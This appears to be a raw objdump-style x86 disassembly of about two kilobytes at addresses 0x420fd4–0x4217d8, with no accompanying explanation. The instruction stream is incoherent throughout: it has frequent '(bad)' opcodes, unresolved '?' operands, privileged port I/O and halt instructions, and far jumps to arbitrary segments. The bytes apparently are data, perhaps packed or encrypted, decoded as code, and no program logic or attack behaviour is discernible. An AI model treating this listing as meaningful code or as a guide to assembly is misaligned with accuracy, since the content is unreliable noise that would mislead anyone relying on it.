  420fd4:	fisubr WORD PTR [edi*2+0x6a01836d]
  420fdb:	push   ss
  420fdc:	mov    eax,0xc8a15f1b
  420fe1:	mov    ebx,0xd61ab72
  420fe6:	hlt    
  420fe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420fe8:	mov    ?,WORD PTR [eax-0xf2bde75]
  420fee:	adc    dl,0x28
  420ff1:	xchg   DWORD PTR [ebp+0x32],esi
  420ff4:	imul   ecx,ebp,0xb7acfa12
  420ffa:	lds    edx,FWORD PTR [edx]
  420ffc:	adc    dh,BYTE PTR [esi]
  420ffe:	out    dx,al
  420fff:	add    al,0x4b
  421001:	enter  0xa7de,0xc7
  421005:	call   FWORD PTR ds:0x10e9e77
  42100b:	mov    dl,0x10
  42100d:	out    0x29,al
  42100f:	push   eax
  421010:	mov    al,ds:0x24b40cba
  421015:	cli    
  421016:	sub    BYTE PTR [eax],cl
  421018:	dec    esi
  421019:	test   DWORD PTR [edi-0x64450b76],eax
  42101f:	cmp    bh,ch
  421021:	push   edx
  421022:	or     BYTE PTR [edi+ecx*1+0x11131bd4],ah
  421029:	sbb    edx,esp
  42102b:	jnp    0x42101b
  42102d:	adc    al,0x62
  42102f:	imul   edi,edx,0x3e0e4c6e
  421035:	lahf   
  421036:	fwait
  421037:	dec    eax
  421038:	inc    ecx
  421039:	enter  0x7493,0x95
  42103d:	call   0x7d25e896
  421042:	dec    esi
  421043:	xchg   ecx,eax
  421044:	lahf   
  421045:	and    DWORD PTR [edx-0x125d6538],edx
  42104b:	or     eax,0xa36aa351
  421050:	inc    ebp
  421051:	mov    edi,0x103c9a48
  421056:	inc    edx
  421057:	ret    0xac45
  42105a:	mov    dh,0xbe
  42105c:	pop    ss
  42105d:	add    ecx,DWORD PTR [esi+0x38]
  421060:	mov    ch,0x25
  421062:	push   ds
  421063:	adc    eax,0xf30e4bf6
  421068:	add    eax,0xcf7e3734
  42106d:	or     ch,ah
  42106f:	dec    ebp
  421070:	jge    0x4210e4
  421072:	jmp    0x5e75:0xaeceddc8
  421079:	movlhps xmm2,xmm1
  42107c:	aaa    
  42107d:	xchg   ecx,eax
  42107e:	clc    
  42107f:	mov    fs,WORD PTR [ecx+0x49b2b549]
  421085:	push   0x4bfef0e2
  42108a:	pop    ss
  42108b:	ret    
  42108c:	(bad)  
  42108d:	in     eax,0x3d
  42108f:	shr    BYTE PTR ds:0xbadae795,0xdb
  421096:	or     ebx,esp
  421098:	aad    0xfe
  42109a:	jmp    0x6d7:0xe8796b0a
  4210a1:	adc    al,0xbb
  4210a3:	jmp    0xaa08:0xcb89404b
  4210aa:	adc    BYTE PTR [edi],dh
  4210ac:	mov    bl,0x7f
  4210ae:	sar    BYTE PTR [eax+0x26],0x92
  4210b2:	pop    ecx
  4210b3:	pusha  
  4210b4:	xchg   edx,eax
  4210b5:	inc    ebx
  4210b6:	push   edx
  4210b7:	and    esp,DWORD PTR [ecx-0x49fcc9f8]
  4210bd:	push   es
  4210be:	pcmpgtd mm1,QWORD PTR [ebx+0x705fd155]
  4210c5:	and    ebp,ebp
  4210c7:	mov    ch,BYTE PTR [esi+eax*1-0x1765c577]
  4210ce:	mov    bl,0xe5
  4210d0:	push   eax
  4210d1:	jno    0x4210a5
  4210d3:	lock sbb BYTE PTR [edi-0x26],bh
  4210d7:	and    edi,esi
  4210d9:	cwde   
  4210da:	mov    es,WORD PTR [edx-0x2e]
  4210dd:	add    DWORD PTR [ebx],0xffffffd0
  4210e0:	sti    
  4210e1:	sbb    DWORD PTR [ebx+0x53],esi
  4210e4:	pusha  
  4210e5:	jo     0x421155
  4210e7:	jbe    0x4210e7
  4210e9:	mov    eax,0xb5486c39
  4210ee:	sbb    eax,0xddce9035
  4210f3:	or     eax,0x58bdddd6
  4210f8:	xchg   edi,eax
  4210f9:	dec    esp
  4210fa:	cli    
  4210fb:	pop    eax
  4210fc:	jl     0x1e2ae685
  421102:	or     dh,al
  421104:	pop    ss
  421105:	jnp    0x4210a3
  421107:	mov    dl,0x21
  421109:	xchg   DWORD PTR [ebx+0x11bcfb41],eax
  42110f:	mov    ebx,0x59899b67
  421114:	int3   
  421115:	iret   
  421116:	repnz sbb al,0x1d
  421119:	pop    edi
  42111a:	cs pop esp
  42111c:	and    ah,ch
  42111e:	xchg   edi,eax
  42111f:	push   esi
  421120:	adc    eax,edx
  421122:	mov    eax,ds:0xddf36076
  421127:	cmp    ebx,DWORD PTR [ebp+0x59]
  42112a:	mov    bl,0x59
  42112c:	jae    0x421155
  42112e:	cld    
  42112f:	aam    0x27
  421131:	push   ecx
  421132:	std    
  421133:	dec    edi
  421134:	aaa    
  421135:	jmp    0xfb21a5ff
  42113a:	adc    dh,BYTE PTR [edi-0x7931abaf]
  421140:	or     bh,0x7f
  421143:	inc    ebp
  421144:	lahf   
  421145:	xchg   BYTE PTR [eax-0x37],bl
  421148:	ins    BYTE PTR es:[edi],dx
  421149:	sbb    BYTE PTR [ebx],dh
  42114b:	xor    eax,0x57c9347d
  421150:	iret   
  421151:	mov    esp,0x1150cb2d
  421156:	loopne 0x421100
  421158:	jle    0x42110f
  42115a:	dec    esp
  42115b:	mov    ah,0xfd
  42115d:	mov    ah,BYTE PTR [esi-0x729b6ea2]
  421163:	out    dx,al
  421164:	jo     0x4211c4
  421166:	sti    
  421167:	outs   dx,DWORD PTR ds:[esi]
  421168:	aad    0x9b
  42116a:	retf   0x9760
  42116d:	out    dx,eax
  42116e:	aaa    
  42116f:	int    0x34
  421171:	enter  0x44ec,0x3c
  421175:	pop    ebp
  421176:	jmp    0xe10795e0
  42117b:	dec    ecx
  42117c:	js     0x421198
  42117e:	add    BYTE PTR [eax],al
  421180:	add    BYTE PTR [eax],al
  421182:	xchg   edi,ecx
  421184:	adc    ebp,DWORD PTR [edx]
  421186:	pop    ebx
  421187:	(bad)  
  421188:	mov    edi,0x5549c1ef
  42118d:	cmp    BYTE PTR [esi-0x4225ab19],ah
  421193:	mov    eax,DWORD PTR [ecx]
  421195:	add    ah,dh
  421197:	add    al,0x0
  421199:	add    BYTE PTR [edi-0x1f],dl
  42119c:	push   edx
  42119d:	fimul  DWORD PTR [edi+0x5c]
  4211a0:	dec    edi
  4211a1:	xchg   esp,eax
  4211a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211a3:	add    DWORD PTR es:[esi],0x3bdcf50e
  4211aa:	pop    edx
  4211ab:	clc    
  4211ac:	(bad)
  4211af:	mov    edx,DWORD PTR [ecx]
  4211b1:	das    
  4211b2:	fnstsw WORD PTR [ebp-0x7d]
  4211b5:	xchg   edi,eax
  4211b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211b7:	mov    al,ds:0xb8375934
  4211bc:	addr16 loopne 0x42118d
  4211bf:	lods   eax,DWORD PTR ds:[esi]
  4211c0:	das    
  4211c1:	jne    0x421170
  4211c3:	fxch   st(0)
  4211c5:	push   cs
  4211c6:	add    edx,ecx
  4211c8:	sub    eax,DWORD PTR [esi-0x829a6d4]
  4211ce:	dec    esi
  4211cf:	mov    edi,0x481f66f8
  4211d4:	clc    
  4211d5:	jp     0x421197
  4211d7:	mov    dl,0xe8
  4211d9:	icebp  
  4211da:	scas   al,BYTE PTR es:[edi]
  4211db:	aas    
  4211dc:	cwde   
  4211dd:	adc    eax,DWORD PTR [esi+0x11]
  4211e0:	xor    eax,0xb3ab1831
  4211e5:	jl     0x4211df
  4211e7:	dec    edi
  4211e8:	call   DWORD PTR [edx+0x39]
  4211eb:	in     al,0x79
  4211ed:	jecxz  0x4211f2
  4211ef:	pushf  
  4211f0:	push   eax
  4211f1:	mov    ebx,0xf34b6b94
  4211f6:	stc    
  4211f7:	in     eax,0xe0
  4211f9:	or     eax,0x278c7939
  4211fe:	out    0x7d,al
  421200:	xchg   ecx,eax
  421201:	ja     0x4211c0
  421203:	xchg   BYTE PTR [edx-0x4984d8d7],cl
  421209:	xor    eax,0xdb3ff18f
  42120e:	mov    esp,edx
  421210:	repz ret 
  421212:	addr16 out 0x7b,eax
  421215:	inc    edx
  421216:	pushf  
  421217:	fistp  DWORD PTR [esi+0x71]
  42121a:	jle    0x42122c
  42121c:	cmp    eax,0xf12dda27
  421221:	xchg   edi,eax
  421222:	jnp    0x4211dc
  421224:	ss aad 0xa4
  421227:	and    eax,0xe0e1610e
  42122c:	retf   0xd740
  42122f:	cmp    ah,0x62
  421232:	dec    ebp
  421233:	mov    dl,0x1a
  421235:	test   al,0xe5
  421237:	mov    al,ds:0xb3e517d1
  42123c:	inc    ebx
  42123d:	pop    ebx
  42123e:	cdq    
  42123f:	cmp    esi,ebp
  421241:	fisub  DWORD PTR [edx-0x454996cc]
  421247:	pop    ebx
  421248:	inc    ebx
  421249:	lds    esi,FWORD PTR [eax-0x1f]
  42124c:	les    ecx,FWORD PTR [eax+0x5]
  42124f:	addr16 push eax
  421251:	push   0x1f6225a1
  421256:	out    dx,eax
  421257:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421258:	or     dh,BYTE PTR [edi]
  42125a:	mov    al,ds:0xec0de7d1
  42125f:	in     eax,0xe5
  421261:	arpl   WORD PTR cs:[ebx*8+0x6590a951],bp
  421269:	lds    edi,FWORD PTR [ecx+0x4fd046e]
  42126f:	test   esi,esi
  421271:	mov    edi,0xa64e3dea
  421276:	jmp    0xb60c82a5
  42127b:	xor    al,0x18
  42127d:	lds    esp,FWORD PTR [ebx+0x258c2f0]
  421283:	inc    eax
  421284:	cmp    edx,0x48
  421287:	cmp    DWORD PTR [edi],ecx
  421289:	icebp  
  42128a:	(bad)  
  42128e:	popf   
  42128f:	push   ecx
  421290:	mov    BYTE PTR [eax+eiz*1-0x8],dh
  421294:	inc    esi
  421295:	(bad)  
  421296:	jb     0x42127f
  421298:	mov    ah,0x72
  42129a:	cmp    al,0xfb
  42129c:	mov    esp,0xc86b1a76
  4212a1:	pushf  
  4212a2:	jl     0x421242
  4212a4:	(bad)  
  4212a5:	adc    DWORD PTR [eax-0x47],ebx
  4212a8:	dec    eax
  4212a9:	leave  
  4212aa:	seta   BYTE PTR [edx+0x26]
  4212ae:	rcr    DWORD PTR [eax],0x59
  4212b1:	inc    esi
  4212b2:	or     esi,DWORD PTR [edi-0x3e]
  4212b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212b6:	mov    cl,0x89
  4212b8:	adc    esp,DWORD PTR [ecx]
  4212ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212bb:	in     al,dx
  4212bc:	or     dl,BYTE PTR [esp+ebx*4]
  4212bf:	jb     0x4212fe
  4212c1:	setnp  BYTE PTR [ecx]
  4212c4:	sub    cl,bl
  4212c6:	xchg   edx,eax
  4212c7:	in     eax,0x26
  4212c9:	aaa    
  4212ca:	jmp    0x42125b
  4212cc:	pop    ecx
  4212cd:	jo     0x42127e
  4212cf:	lds    edx,FWORD PTR [ebx+0x6732c121]
  4212d5:	dec    ebp
  4212d6:	frstor [ecx]
  4212d8:	xchg   BYTE PTR [ecx+0x18b7565e],dh
  4212de:	gs pop edx
  4212e0:	popf   
  4212e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212e2:	sbb    ecx,DWORD PTR gs:[ebp+0x3a124560]
  4212e9:	ss mov esp,0x99fde5f8
  4212ef:	jo     0x42128d
  4212f1:	(bad)  
  4212f2:	xchg   ebp,eax
  4212f3:	lahf   
  4212f4:	jb     0x4212f9
  4212f6:	mov    ds:0x21118668,eax
  4212fb:	and    al,0x53
  4212fd:	sub    al,0x5c
  4212ff:	sbb    DWORD PTR ds:0x849ce07a,0xffffffb2
  421306:	sub    al,0x3e
  421308:	icebp  
  421309:	imul   ch
  42130b:	dec    ecx
  42130c:	nop
  42130d:	in     eax,dx
  42130e:	xor    bl,dl
  421310:	mov    cl,0x1d
  421312:	pop    ds
  421313:	jb     0x4212bb
  421315:	ins    DWORD PTR es:[edi],dx
  421316:	xchg   ebp,eax
  421317:	aas    
  421318:	mov    edx,0x5bd0f964
  42131d:	rol    ebp,cl
  42131f:	aas    
  421320:	xchg   edi,eax
  421321:	jge    0x4212c3
  421323:	push   ebx
  421324:	inc    ebp
  421325:	into   
  421326:	push   cs
  421327:	arpl   WORD PTR [edi+0x5a96e2fb],ax
  42132d:	inc    esp
  42132e:	or     eax,0xc834571d
  421333:	gs ds mov edi,0xb6631668
  42133a:	sbb    eax,0xf34ad55b
  42133f:	mov    ecx,0xb41c3cb6
  421344:	adc    BYTE PTR [eax],bh
  421346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421347:	out    0x56,eax
  421349:	ds stos DWORD PTR es:[edi],eax
  42134b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42134c:	mov    al,0xb0
  42134e:	jb     0x4213c7
  421350:	mov    ebp,0xbf77fe90
  421355:	adc    DWORD PTR [ebx-0x66],edi
  421358:	mov    ecx,0x7afb00ec
  42135d:	sbb    eax,0xc9935d90
  421362:	stos   BYTE PTR es:[edi],al
  421363:	dec    edx
  421364:	daa    
  421365:	repnz mov ds:0x22ba24cc,al
  42136b:	ret    
  42136c:	mov    ah,0xa8
  42136e:	push   ds
  42136f:	mov    gs:0x9ed4777d,al
  421375:	xor    eax,0xa22681cc
  42137a:	fcom   QWORD PTR [ebp-0x31]
  42137d:	aam    0xa9
  42137f:	jno    0x42137e
  421381:	in     eax,dx
  421382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421383:	push   ss
  421384:	push   0xb3d96532
  421389:	cwde   
  42138a:	mov    esp,0xf6e869ca
  42138f:	inc    edx
  421390:	mov    eax,ds:0x58cdf589
  421395:	enter  0x57e4,0x75
  421399:	add    eax,0x7cf7cea9
  42139e:	outs   dx,BYTE PTR ds:[esi]
  42139f:	jae    0x421321
  4213a1:	or     al,0xe7
  4213a3:	jbe    0x42132e
  4213a5:	dec    ebp
  4213a6:	test   eax,0x97294f00
  4213ab:	push   ebx
  4213ac:	and    al,0xbc
  4213ae:	inc    ebx
  4213af:	and    BYTE PTR [edi-0x321f24b0],cl
  4213b5:	mov    WORD PTR [esi+0x7b],gs
  4213b8:	xor    esp,DWORD PTR [eax]
  4213ba:	pop    ebx
  4213bb:	push   ebp
  4213bc:	jb     0x42140c
  4213be:	cdq    
  4213bf:	push   ds
  4213c0:	push   esi
  4213c1:	psubsb mm7,QWORD PTR [ebp-0x46]
  4213c5:	mov    eax,0xdee5adea
  4213ca:	sub    al,0x87
  4213cc:	int    0x98
  4213ce:	xchg   DWORD PTR [eax+eiz*8],ebp
  4213d1:	fild   DWORD PTR [ebx+0x59]
  4213d4:	xrelease mov DWORD PTR [edi-0x5a451dab],edx
  4213db:	test   BYTE PTR [ebx-0x6a],bl
  4213de:	clc    
  4213df:	push   esp
  4213e0:	movq   QWORD PTR [ebx-0x70],mm6
  4213e4:	jmp    0xfb17d944
  4213e9:	mov    ds:0x42577c31,al
  4213ee:	add    dl,BYTE PTR [edi-0x66]
  4213f1:	mov    eax,ds:0x4d15626d
  4213f6:	xchg   edi,eax
  4213f7:	fstp   QWORD PTR [edx+0x206f48af]
  4213fd:	ja     0x421431
  4213ff:	jno    0x421437
  421401:	rcl    bl,1
  421403:	sub    al,0x2
  421405:	jecxz  0x4213d4
  421407:	pop    ss
  421408:	jns    0x4213c1
  42140a:	cld    
  42140b:	inc    ecx
  42140c:	rcr    BYTE PTR [edi+esi*2],cl
  42140f:	or     eax,0xdee6e22b
  421414:	inc    ecx
  421415:	(bad)  
  421416:	daa    
  421417:	pushw  ss
  421419:	int3   
  42141a:	loopne 0x4213ed
  42141c:	mov    ebx,0xe7c1c712
  421421:	test   DWORD PTR [ecx],ebx
  421423:	imul   DWORD PTR [ecx+0x57]
  421426:	mov    ch,0x6d
  421428:	mov    ds:0x50d2353e,al
  42142d:	pop    ecx
  42142e:	mov    esp,0xa109575f
  421433:	mov    bl,0xe4
  421435:	pop    esi
  421436:	sbb    BYTE PTR [ebx+0x6],al
  421439:	lods   al,BYTE PTR ds:[esi]
  42143a:	call   0xadf6:0x7937f49b
  421441:	jle    0x4213f7
  421443:	xor    esp,DWORD PTR [esp+eax*4+0x2ac07fed]
  42144a:	mov    esi,0x2a936eae
  42144f:	push   fs
  421451:	and    ebp,DWORD PTR [edi-0x3e]
  421454:	xchg   ebp,eax
  421455:	bound  eax,QWORD PTR [ebp-0x6e]
  421458:	xor    DWORD PTR [ebp+0x78],edx
  42145b:	enter  0x45c7,0x3c
  42145f:	mov    dl,0x1c
  421461:	ja     0x4213fd
  421463:	dec    eax
  421464:	int    0x4e
  421466:	mov    edx,0x945ce538
  42146b:	pop    ss
  42146c:	ret    0x15fd
  42146f:	ds clc 
  421471:	push   ds
  421472:	pop    ebx
  421473:	outs   dx,BYTE PTR ds:[esi]
  421474:	icebp  
  421475:	xor    al,0xf9
  421477:	xor    eax,0xeb98061b
  42147c:	out    dx,eax
  42147d:	addr16 test al,0x46
  421480:	and    esi,ebx
  421482:	cld    
  421483:	fidiv  WORD PTR [edi+ebp*8]
  421486:	pop    ss
  421487:	lock hlt 
  421489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42148a:	pop    ss
  42148b:	lds    edi,FWORD PTR [eax+eax*8]
  42148e:	lahf   
  42148f:	xchg   edx,eax
  421490:	sub    eax,0x962ac6bf
  421495:	scas   al,BYTE PTR es:[edi]
  421496:	and    BYTE PTR [ebx+0x7467bfc9],cl
  42149c:	and    dh,BYTE PTR ss:[eax]
  42149f:	cli    
  4214a0:	add    esp,DWORD PTR [ecx]
  4214a2:	(bad)  
  4214a3:	mov    edi,0x92ed0ed9
  4214a8:	test   BYTE PTR [esi],dh
  4214aa:	fmul   DWORD PTR [eax+0xb573df7]
  4214b0:	mov    al,ds:0x4f8a5153
  4214b5:	mov    ah,0xbc
  4214b7:	ds dec edx
  4214b9:	mov    bl,0xa2
  4214bb:	call   0x57b1:0xbad559d0
  4214c2:	lds    ecx,FWORD PTR [esp+ebp*8-0x79]
  4214c6:	pop    DWORD PTR [edi+0x49ee290f]
  4214cc:	xor    eax,0x7210ce84
  4214d1:	imul   ebx,DWORD PTR [esi+0x68f801ee],0xffffff9a
  4214d8:	dec    ecx
  4214d9:	in     eax,0x65
  4214db:	cmp    DWORD PTR [ebp+esi*1-0x6c5b626b],ecx
  4214e2:	lods   eax,DWORD PTR ds:[esi]
  4214e3:	push   cs
  4214e4:	inc    esp
  4214e5:	sub    ch,ch
  4214e7:	pushf  
  4214e8:	fisttp DWORD PTR [ebx-0x457ca9]
  4214ee:	inc    esi
  4214ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4214f0:	arpl   WORD PTR [ebx],bp
  4214f2:	pop    eax
  4214f3:	cmp    eax,0xcac4abee
  4214f8:	jmp    DWORD PTR [ebx-0x3c]
  4214fb:	dec    ebx
  4214fc:	fsub   QWORD PTR [ecx-0x80]
  4214ff:	jp     0x42155a
  421501:	xor    BYTE PTR [ebx-0x14],0xbc
  421505:	call   0x924e:0xcd27275
  42150c:	adc    edi,DWORD PTR [edi]
  42150e:	mov    esi,0x99f1ad3
  421513:	mov    ch,0x64
  421515:	push   eax
  421516:	shl    BYTE PTR [eax-0x74bfca40],cl
  42151c:	xchg   ebx,eax
  42151d:	pop    esi
  42151e:	je     0x421562
  421520:	xor    ebp,0x7cdc695d
  421526:	mov    ah,0x3b
  421528:	mov    eax,0x7c9951b7
  42152d:	sti    
  42152e:	dec    ebx
  42152f:	lock les edi,FWORD PTR [ebx+esi*2+0x202bd190]
  421537:	xor    bh,BYTE PTR [ecx-0x432eabc9]
  42153d:	ret    0x650b
  421540:	fs push esi
  421542:	cmp    bl,BYTE PTR [edx+0x451bd595]
  421548:	xchg   BYTE PTR [ebp+0x36],dl
  42154b:	push   eax
  42154c:	into   
  42154d:	adc    bl,BYTE PTR [esi]
  42154f:	cmp    ebp,eax
  421551:	add    DWORD PTR es:[esi+0x8],ebx
  421555:	popf   
  421556:	jbe    0x4214f5
  421558:	clc    
  421559:	test   al,0xcb
  42155b:	adc    dh,al
  42155d:	cmp    eax,0x49789c1a
  421562:	push   cs
  421563:	loop   0x421536
  421565:	mov    eax,gs:0x938c724f
  42156b:	xor    DWORD PTR [ebp+edi*4+0x4a21f2af],ecx
  421572:	ja     0x421599
  421574:	xchg   BYTE PTR [edi+0x7ec494f7],bl
  42157a:	jle    0x4215d8
  42157c:	pop    ss
  42157d:	call   0x1d2:0x2dab7dc0
  421584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421585:	add    eax,0x8a1750c0
  42158a:	pusha  
  42158b:	add    al,0x5b
  42158d:	out    0xca,eax
  42158f:	popf   
  421590:	stc    
  421591:	popa   
  421592:	int    0xb1
  421594:	loope  0x4215d7
  421596:	or     edi,DWORD PTR [edi]
  421598:	outs   dx,BYTE PTR ds:[esi]
  421599:	add    edi,ecx
  42159b:	shl    BYTE PTR [esi],0xa
  42159e:	scas   eax,DWORD PTR es:[edi]
  42159f:	(bad)  [edx-0x44]
  4215a2:	inc    ebx
  4215a3:	inc    edi
  4215a4:	xlat   BYTE PTR gs:[ebx]
  4215a6:	loope  0x42157a
  4215a8:	clc    
  4215a9:	sbb    al,0xfe
  4215ab:	xchg   ch,dh
  4215ad:	jb     0x42159b
  4215af:	in     eax,dx
  4215b0:	sti    
  4215b1:	cmp    BYTE PTR [edx],bl
  4215b3:	ja     0x421553
  4215b5:	add    dh,cl
  4215b7:	dec    esp
  4215b8:	popf   
  4215b9:	cmp    eax,0xdadda5ba
  4215be:	push   ebx
  4215bf:	jbe    0x4215fb
  4215c1:	xor    al,0xf3
  4215c3:	and    BYTE PTR [ebx-0x57],ch
  4215c6:	adc    al,0xcc
  4215c8:	cmp    DWORD PTR [edx+0xb4718c0],ebx
  4215ce:	clc    
  4215cf:	dec    ecx
  4215d0:	inc    eax
  4215d1:	cmp    ebx,DWORD PTR [ebp+0x23]
  4215d4:	call   0x5641:0x5decaacd
  4215db:	ffreep st(2)
  4215dd:	nop
  4215de:	mov    ah,0xfd
  4215e0:	cli    
  4215e1:	or     al,0xfa
  4215e3:	sub    eax,0x47648740
  4215e8:	push   esi
  4215e9:	bound  esi,QWORD PTR [eax]
  4215eb:	cmp    esi,eax
  4215ed:	and    eax,0x41ac0e79
  4215f2:	stos   DWORD PTR es:[edi],eax
  4215f3:	mov    ebx,0xc7be08f0
  4215f8:	add    al,0x27
  4215fa:	retf   0x82fd
  4215fd:	(bad)  
  4215fe:	xor    eax,0xb43762d7
  421603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421604:	push   ss
  421605:	gs sub ebx,ebp
  421608:	or     eax,0xddcccec8
  42160d:	jne    0x42160f
  42160f:	mov    eax,0xe14de645
  421614:	push   es
  421615:	mov    esp,ebp
  421617:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421618:	cmp    al,0x8e
  42161a:	push   edi
  42161b:	outs   dx,DWORD PTR ds:[esi]
  42161c:	push   esp
  42161d:	pop    es
  42161e:	(bad)  
  42161f:	mov    esi,0x607fd03a
  421624:	cmp    BYTE PTR [esi],bh
  421626:	aam    0xcc
  421628:	out    0xc5,al
  42162a:	jl     0x421610
  42162c:	mov    BYTE PTR [ecx-0x18],bh
  42162f:	stos   DWORD PTR es:[edi],eax
  421630:	(bad)  
  421632:	nop
  421633:	cs or  al,0x36
  421636:	js     0x4216aa
  421638:	pop    ebx
  421639:	daa    
  42163a:	iret   
  42163b:	fld    TBYTE PTR [ebp-0x1f8aca70]
  421641:	imul   esi,DWORD PTR [edi+esi*2],0x47c6c9d1
  421648:	push   esp
  421649:	imul   eax,DWORD PTR [ebx-0x5575006a],0xb08bc28
  421653:	sub    DWORD PTR [edx+0x5dd666ac],esi
  421659:	cli    
  42165a:	mov    ch,BYTE PTR [edi-0x4a616478]
  421660:	dec    edi
  421661:	mov    DWORD PTR [esi+0x63],ebp
  421664:	lds    edx,FWORD PTR [edx+eax*1-0x79]
  421668:	jge    0x421695
  42166a:	mov    BYTE PTR [eax],0x2b
  42166d:	sbb    eax,esi
  42166f:	jne    0x421633
  421671:	mov    cl,0xf1
  421673:	xor    eax,0x8fb0e7e
  421678:	mov    ebx,0xda0b3e7a
  42167d:	inc    edx
  42167e:	or     BYTE PTR [ebx-0x7],ch
  421681:	adc    al,0x7f
  421683:	cmp    ecx,DWORD PTR [edi+edi*1]
  421686:	fcmovb st,st(6)
  421688:	aaa    
  421689:	ret    
  42168a:	fneni(8087 only) 
  42168c:	xlat   BYTE PTR ds:[ebx]
  42168d:	xchg   ecx,eax
  42168e:	add    BYTE PTR [eax],al
  421690:	add    BYTE PTR [eax],al
  421692:	sti    
  421693:	and    al,0xdc
  421695:	es (bad) 
  421698:	sti    
  421699:	std    
  42169a:	sbb    ch,BYTE PTR [edx]
  42169c:	adc    eax,0x4c090ac6
  4216a1:	clc    
  4216a2:	mov    cl,0x90
  4216a4:	add    DWORD PTR [eax],eax
  4216a6:	hlt    
  4216a7:	add    al,0x0
  4216a9:	add    al,dh
  4216ab:	js     0x4216e1
  4216ad:	sub    BYTE PTR [ebp+esi*4+0x6ca2473],al
  4216b4:	mov    al,0x32
  4216b6:	or     DWORD PTR [edx],esp
  4216b8:	js     0x421729
  4216ba:	sub    al,0x89
  4216bc:	mov    WORD PTR [edx+0x52],?
  4216bf:	enter  0x99e,0x48
  4216c3:	(bad)  
  4216c4:	cmc    
  4216c5:	xlat   BYTE PTR ds:[ebx]
  4216c6:	out    0x4e,eax
  4216c8:	inc    edi
  4216c9:	inc    ebp
  4216ca:	outs   dx,BYTE PTR ds:[esi]
  4216cb:	daa    
  4216cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4216cd:	inc    ecx
  4216ce:	sbb    BYTE PTR ss:[edi+0x4d98270c],dh
  4216d5:	pop    ebp
  4216d6:	xor    DWORD PTR [ecx-0x2c2e27b2],ebp
  4216dc:	pop    ss
  4216dd:	jno    0x42170b
  4216df:	or     al,0x5a
  4216e1:	into   
  4216e2:	push   ds
  4216e3:	jbe    0x42172c
  4216e5:	test   eax,0x571cf163
  4216ea:	cmp    BYTE PTR [edi],cl
  4216ec:	test   bl,0x4e
  4216ef:	inc    eax
  4216f0:	xchg   ebx,eax
  4216f1:	push   0x16
  4216f3:	push   edx
  4216f4:	cwde   
  4216f5:	daa    
  4216f6:	jmp    0xb2bdf7
  4216fb:	in     eax,dx
  4216fc:	int3   
  4216fd:	shr    ch,1
  4216ff:	and    ch,al
  421701:	ja     0x421772
  421703:	scas   eax,DWORD PTR es:[edi]
  421704:	jb     0x4216f4
  421706:	out    dx,al
  421707:	or     DWORD PTR [edi],0x83d26579
  42170d:	push   ss
  42170e:	sti    
  42170f:	ins    BYTE PTR es:[edi],dx
  421710:	stos   BYTE PTR es:[edi],al
  421711:	mov    edx,0x7f8532d7
  421716:	daa    
  421717:	test   BYTE PTR [eax+0x50],ah
  42171a:	mov    edx,0xae334be3
  42171f:	push   0xffffffab
  421721:	popf   
  421722:	mov    ebx,0xcf68e4f2
  421727:	mov    DWORD PTR [ebx],ebp
  421729:	pop    ss
  42172a:	add    ebx,DWORD PTR ds:0x25a1c0a0
  421730:	fwait
  421731:	out    0x3a,al
  421733:	lods   eax,DWORD PTR ds:[esi]
  421734:	sbb    BYTE PTR [esi],dl
  421736:	retf   0x74da
  421739:	lock pop ds
  42173b:	(bad)  
  42173c:	out    dx,al
  42173d:	fdivr  QWORD PTR [edx]
  42173f:	cmc    
  421740:	dec    ebp
  421741:	add    BYTE PTR [ebx-0x15028e69],al
  421747:	dec    edx
  421748:	add    eax,0xc575bbd5
  42174d:	shr    al,cl
  42174f:	sti    
  421750:	loopne 0x4217c8
  421752:	mov    edi,0xdf55d105
  421757:	sbb    ch,BYTE PTR [ebx+0x132678cc]
  42175d:	add    BYTE PTR ds:0x1ca8c193,0xc8
  421764:	xlat   BYTE PTR ds:[ebx]
  421765:	pusha  
  421766:	in     eax,dx
  421767:	call   0xdb8c:0x44df16b5
  42176e:	cdq    
  42176f:	js     0x4217cf
  421771:	mov    bl,0x27
  421773:	dec    ebx
  421774:	ins    BYTE PTR es:[edi],dx
  421775:	jge    0x42170c
  421777:	and    eax,0xf4fbac2e
  42177c:	add    dh,BYTE PTR [ebp+0x3dbd2564]
  421782:	jns    0x421733
  421784:	or     eax,DWORD PTR [edx-0x51]
  421787:	sbb    ch,BYTE PTR [edx+eiz*8-0x3a]
  42178b:	cs popa 
  42178d:	add    eax,0x5b3fe5d2
  421792:	add    al,0x11
  421794:	adc    bl,BYTE PTR cs:[ebx]
  421797:	mov    eax,ds:0xcab8846
  42179c:	fcom   DWORD PTR [esi-0x4098138b]
  4217a2:	arpl   WORD PTR [eax+0xb],si
  4217a5:	sub    BYTE PTR [edx-0x2f],bl
  4217a8:	adc    ah,BYTE PTR [ebx]
  4217aa:	dec    ebx
  4217ab:	push   esi
  4217ac:	loopne 0x4217f4
  4217ae:	fisub  DWORD PTR [esi-0xa3af395]
  4217b4:	loope  0x421808
  4217b6:	push   ds
  4217b7:	or     eax,0x19bb2f4d
  4217bc:	or     bl,BYTE PTR [edx+0x3a]
  4217bf:	je     0x42179a
  4217c1:	gs adc al,0x34
  4217c4:	and    esi,DWORD PTR [ebx+0x38]
  4217c7:	xchg   DWORD PTR [ebx],ebx
  4217c9:	sub    BYTE PTR ds:0x49955265,cl
  4217cf:	inc    esi
  4217d0:	and    DWORD PTR [esi],ebx
  4217d2:	push   esi
  4217d3:	nop
  4217d4:	ret    
  4217d5:	mov    DWORD PTR [esi+0x44],ecx
  4217d8:	cmp    ebx,DWORD PTR [edi-0x5d]
